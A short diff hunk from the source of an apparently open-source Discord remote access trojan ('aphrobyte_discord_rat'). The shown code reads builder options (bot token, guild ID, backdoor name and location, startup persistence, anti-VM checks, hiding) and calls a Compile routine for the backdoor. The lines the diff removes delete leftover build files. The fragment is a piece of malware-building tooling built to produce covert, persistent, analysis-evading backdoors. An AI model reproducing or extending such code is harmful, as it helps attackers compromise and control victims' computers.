@@ -86,22 +86,6 @@ namespace aphrobyte_discord_rat
                 bool antivm = checkBox2.Checked;
                 bool hide = checkBox4.Checked;
                 Compile(guildid, bottoken, alertsid, processname, backdoorname, backdoorlocation, startup, antivm, hide);
-                if (Directory.Exists("dist"))
-                {
-                    Directory.Delete("dist", true);
-                }
-                if (Directory.Exists("build"))
-                {
-                    Directory.Delete("build", true);
-                }
-                if (File.Exists($"{backdoorname}.spec"))
-                {
-                    File.Delete($"{backdoorname}.spec");
-                }
-                if (File.Exists(".buildmodules\\main.py"))
-                {
-                    File.Delete(".buildmodules\\main.py");
-                }
 
             } else
             {
